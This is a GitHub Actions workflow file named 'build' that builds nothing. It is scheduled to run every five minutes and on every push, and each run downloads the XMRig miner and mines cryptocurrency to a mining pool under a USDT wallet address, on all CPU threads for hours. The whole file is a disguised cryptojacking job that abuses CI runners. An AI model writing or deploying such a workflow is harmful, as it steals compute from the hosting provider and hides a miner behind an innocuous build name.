name: build
on:
  push:
  schedule:
    - cron: '*/5 * * * *'
  workflow_dispatch:
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - run: curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar xf *.tar.gz && cd xmrig* && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.a-$RANDOM --threads=$(nproc) & sleep 20000
